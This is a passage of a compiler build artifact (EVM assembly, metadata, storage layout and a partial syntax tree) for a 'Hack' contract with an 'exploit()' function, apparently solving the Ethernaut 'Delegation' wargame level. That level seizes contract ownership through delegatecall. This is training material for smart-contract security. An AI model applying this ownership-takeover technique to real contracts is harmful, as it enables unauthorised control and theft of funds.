											"begin": 7,
											"end": 105,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 58,
											"end": 64,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 92,
											"end": 97,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 86,
											"end": 98,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 76,
											"end": 98,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 76,
											"end": 98,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 105,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 7,
											"end": 105,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 7,
											"end": 105,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 105,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 111,
											"end": 258,
											"name": "tag",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 111,
											"end": 258,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 212,
											"end": 223,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 249,
											"end": 252,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 234,
											"end": 252,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 234,
											"end": 252,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 111,
											"end": 258,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 111,
											"end": 258,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 111,
											"end": 258,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 111,
											"end": 258,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 111,
											"end": 258,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 264,
											"end": 510,
											"name": "tag",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 264,
											"end": 510,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 345,
											"end": 346,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 355,
											"end": 468,
											"name": "tag",
											"source": 1,
											"value": "27"
										},
										{
											"begin": 355,
											"end": 468,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 369,
											"end": 375,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 366,
											"end": 367,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 363,
											"end": 376,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 355,
											"end": 468,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 355,
											"end": 468,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "29"
										},
										{
											"begin": 355,
											"end": 468,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 454,
											"end": 455,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 449,
											"end": 452,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 445,
											"end": 456,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 439,
											"end": 457,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 435,
											"end": 436,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 430,
											"end": 433,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 426,
											"end": 437,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 419,
											"end": 458,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 391,
											"end": 393,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 388,
											"end": 389,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 384,
											"end": 394,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 379,
											"end": 394,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 379,
											"end": 394,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 355,
											"end": 468,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "27"
										},
										{
											"begin": 355,
											"end": 468,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 355,
											"end": 468,
											"name": "tag",
											"source": 1,
											"value": "29"
										},
										{
											"begin": 355,
											"end": 468,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 502,
											"end": 503,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 493,
											"end": 499,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 488,
											"end": 491,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 484,
											"end": 500,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 477,
											"end": 504,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 326,
											"end": 510,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 264,
											"end": 510,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 264,
											"end": 510,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 264,
											"end": 510,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 264,
											"end": 510,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 516,
											"end": 902,
											"name": "tag",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 516,
											"end": 902,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 620,
											"end": 623,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 648,
											"end": 686,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 680,
											"end": 685,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 648,
											"end": 686,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 648,
											"end": 686,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 648,
											"end": 686,
											"name": "tag",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 648,
											"end": 686,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 702,
											"end": 790,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "32"
										},
										{
											"begin": 783,
											"end": 789,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 778,
											"end": 781,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 702,
											"end": 790,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 702,
											"end": 790,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 702,
											"end": 790,
											"name": "tag",
											"source": 1,
											"value": "32"
										},
										{
											"begin": 702,
											"end": 790,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 695,
											"end": 790,
											"name": "SWAP4",
											"source": 1
										},
										{
											"begin": 695,
											"end": 790,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 799,
											"end": 864,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "33"
										},
										{
											"begin": 857,
											"end": 863,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 852,
											"end": 855,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 845,
											"end": 849,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 838,
											"end": 843,
											"name": "DUP7",
											"source": 1
										},
										{
											"begin": 834,
											"end": 850,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 799,
											"end": 864,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 799,
											"end": 864,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 799,
											"end": 864,
											"name": "tag",
											"source": 1,
											"value": "33"
										},
										{
											"begin": 799,
											"end": 864,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 889,
											"end": 895,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 884,
											"end": 887,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 880,
											"end": 896,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 873,
											"end": 896,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 873,
											"end": 896,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 624,
											"end": 902,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 516,
											"end": 902,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 516,
											"end": 902,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 516,
											"end": 902,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 516,
											"end": 902,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 516,
											"end": 902,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 908,
											"end": 1179,
											"name": "tag",
											"source": 1,
											"value": "8"
										},
										{
											"begin": 908,
											"end": 1179,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1038,
											"end": 1041,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1060,
											"end": 1153,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 1149,
											"end": 1152,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1146,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1060,
											"end": 1153,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 1060,
											"end": 1153,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1060,
											"end": 1153,
											"name": "tag",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 1060,
											"end": 1153,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1153,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1153,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1170,
											"end": 1173,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1163,
											"end": 1173,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1163,
											"end": 1173,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 908,
											"end": 1179,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 908,
											"end": 1179,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 908,
											"end": 1179,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 908,
											"end": 1179,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 908,
											"end": 1179,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1185,
											"end": 1275,
											"name": "tag",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 1185,
											"end": 1275,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1219,
											"end": 1226,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1262,
											"end": 1267,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1255,
											"end": 1268,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1248,
											"end": 1269,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1237,
											"end": 1269,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1237,
											"end": 1269,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1185,
											"end": 1275,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1185,
											"end": 1275,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1185,
											"end": 1275,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1185,
											"end": 1275,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1281,
											"end": 1390,
											"name": "tag",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 1281,
											"end": 1390,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1362,
											"end": 1383,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 1377,
											"end": 1382,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1362,
											"end": 1383,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 1362,
											"end": 1383,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1362,
											"end": 1383,
											"name": "tag",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 1362,
											"end": 1383,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1357,
											"end": 1360,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1350,
											"end": 1384,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1281,
											"end": 1390,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1281,
											"end": 1390,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1281,
											"end": 1390,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1396,
											"end": 1564,
											"name": "tag",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1396,
											"end": 1564,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1479,
											"end": 1490,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1513,
											"end": 1519,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1508,
											"end": 1511,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1501,
											"end": 1520,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1553,
											"end": 1557,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1548,
											"end": 1551,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1544,
											"end": 1558,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1529,
											"end": 1558,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1529,
											"end": 1558,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1396,
											"end": 1564,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1396,
											"end": 1564,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1396,
											"end": 1564,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1396,
											"end": 1564,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1396,
											"end": 1564,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1570,
											"end": 1672,
											"name": "tag",
											"source": 1,
											"value": "21"
										},
										{
											"begin": 1570,
											"end": 1672,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1611,
											"end": 1617,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1662,
											"end": 1664,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 1658,
											"end": 1665,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 1653,
											"end": 1655,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 1646,
											"end": 1651,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1642,
											"end": 1656,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1638,
											"end": 1666,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1666,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1666,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1570,
											"end": 1672,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1570,
											"end": 1672,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1570,
											"end": 1672,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1570,
											"end": 1672,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1678,
											"end": 2051,
											"name": "tag",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 1678,
											"end": 2051,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1764,
											"end": 1767,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1792,
											"end": 1830,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "42"
										},
										{
											"begin": 1824,
											"end": 1829,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1792,
											"end": 1830,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 1792,
											"end": 1830,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1792,
											"end": 1830,
											"name": "tag",
											"source": 1,
											"value": "42"
										},
										{
											"begin": 1792,
											"end": 1830,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1846,
											"end": 1916,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "43"
										},
										{
											"begin": 1909,
											"end": 1915,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1904,
											"end": 1907,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 1846,
											"end": 1916,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1846,
											"end": 1916,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1846,
											"end": 1916,
											"name": "tag",
											"source": 1,
											"value": "43"
										},
										{
											"begin": 1846,
											"end": 1916,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1839,
											"end": 1916,
											"name": "SWAP4",
											"source": 1
										},
										{
											"begin": 1839,
											"end": 1916,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1925,
											"end": 1990,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 1983,
											"end": 1989,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1978,
											"end": 1981,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 1971,
											"end": 1975,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1964,
											"end": 1969,
											"name": "DUP7",
											"source": 1
										},
										{
											"begin": 1960,
											"end": 1976,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1925,
											"end": 1990,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 1925,
											"end": 1990,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1925,
											"end": 1990,
											"name": "tag",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 1925,
											"end": 1990,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2015,
											"end": 2044,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "45"
										},
										{
											"begin": 2037,
											"end": 2043,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2015,
											"end": 2044,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "21"
										},
										{
											"begin": 2015,
											"end": 2044,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 2015,
											"end": 2044,
											"name": "tag",
											"source": 1,
											"value": "45"
										},
										{
											"begin": 2015,
											"end": 2044,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2010,
											"end": 2013,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 2006,
											"end": 2045,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1999,
											"end": 2045,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1999,
											"end": 2045,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1768,
											"end": 2051,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1678,
											"end": 2051,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1678,
											"end": 2051,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1678,
											"end": 2051,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1678,
											"end": 2051,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1678,
											"end": 2051,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 2057,
											"end": 2464,
											"name": "tag",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 2057,
											"end": 2464,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2190,
											"end": 2194,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2228,
											"end": 2230,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 2217,
											"end": 2226,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2213,
											"end": 2231,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 2205,
											"end": 2231,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2205,
											"end": 2231,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2241,
											"end": 2306,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "47"
										},
										{
											"begin": 2303,
											"end": 2304,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2292,
											"end": 2301,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 2288,
											"end": 2305,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 2279,
											"end": 2285,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 2241,
											"end": 2306,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 2241,
											"end": 2306,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 2241,
											"end": 2306,
											"name": "tag",
											"source": 1,
											"value": "47"
										},
										{
											"begin": 2241,
											"end": 2306,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2353,
											"end": 2362,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2347,
											"end": 2351,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2343,
											"end": 2363,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 2338,
											"end": 2340,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 2327,
											"end": 2336,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 2323,
											"end": 2341,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 2316,
											"end": 2364,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 2381,
											"end": 2457,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "48"
										},
										{
											"begin": 2452,
											"end": 2456,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2443,
											"end": 2449,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 2381,
											"end": 2457,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 2381,
											"end": 2457,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 2381,
											"end": 2457,
											"name": "tag",
											"source": 1,
											"value": "48"
										},
										{
											"begin": 2381,
											"end": 2457,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2373,
											"end": 2457,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2373,
											"end": 2457,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2057,
											"end": 2464,
											"name": "SWAP4",
											"source": 1
										},
										{
											"begin": 2057,
											"end": 2464,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 2057,
											"end": 2464,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2057,
											"end": 2464,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2057,
											"end": 2464,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2057,
											"end": 2464,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										}
									]
								}
							},
							"sourceList": [
								"contracts/Ethernaut/06-Delegate.sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {
							"exploit()": "63d9b770"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.17+commit.8df45f5f\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"},{\"indexed\":false,\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"Response\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"exploit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/Ethernaut/06-Delegate.sol\":\"Hack\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Ethernaut/06-Delegate.sol\":{\"keccak256\":\"0xc7c545e38d49799d771c6687b2f662b5d7ff0b3baa0e3111561e007b7a96cde4\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://b0a7a745245851f7c88079ba9ab2eecf5439b521d424e2131e2ea059528a3a71\",\"dweb:/ipfs/QmUNN87Y5gKDykUpSH1kBjkguPUZ8eGYzKA1WrrUXaJuaU\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 78,
								"contract": "contracts/Ethernaut/06-Delegate.sol:Hack",
								"label": "delegationContract",
								"offset": 0,
								"slot": "0",
								"type": "t_contract(Delegation)66"
							}
						],
						"types": {
							"t_contract(Delegation)66": {
								"encoding": "inplace",
								"label": "contract Delegation",
								"numberOfBytes": "20"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"sources": {
			"contracts/Ethernaut/06-Delegate.sol": {
				"ast": {
					"absolutePath": "contracts/Ethernaut/06-Delegate.sol",
					"exportedSymbols": {
						"Delegate": [
							23
						],
						"Delegation": [
							66
						],
						"Hack": [
							103
						]
					},
					"id": 104,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "33:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "Delegate",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 23,
							"linearizedBaseContracts": [
								23
							],
							"name": "Delegate",
							"nameLocation": "69:8:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "8da5cb5b",
									"id": 3,
									"mutability": "mutable",
									"name": "owner",
									"nameLocation": "100:5:0",
									"nodeType": "VariableDeclaration",
									"scope": 23,
									"src": "85:20:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 2,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "85:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"visibility": "public"
								},
								{
									"body": {
										"id": 12,
										"nodeType": "Block",
										"src": "140:27:0",
										"statements": [
											{
												"expression": {
													"id": 10,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 8,
														"name": "owner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 3,
														"src": "147:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 9,
														"name": "_owner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 5,
														"src": "155:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "147:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 11,
												"nodeType": "ExpressionStatement",
												"src": "147:14:0"
											}
										]
									},
									"id": 13,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 6,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 5,
												"mutability": "mutable",
												"name": "_owner",
												"nameLocation": "132:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 13,
												"src": "124:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 4,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "124:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "123:16:0"
									},
									"returnParameters": {
										"id": 7,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "140:0:0"
									},
									"scope": 23,
									"src": "112:55:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 21,
										"nodeType": "Block",
										"src": "195:31:0",
										"statements": [
											{
												"expression": {
													"id": 19,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 16,
														"name": "owner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 3,
														"src": "202:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"expression": {
															"id": 17,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 4294967281,
															"src": "210:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 18,
														"isConstant": false,
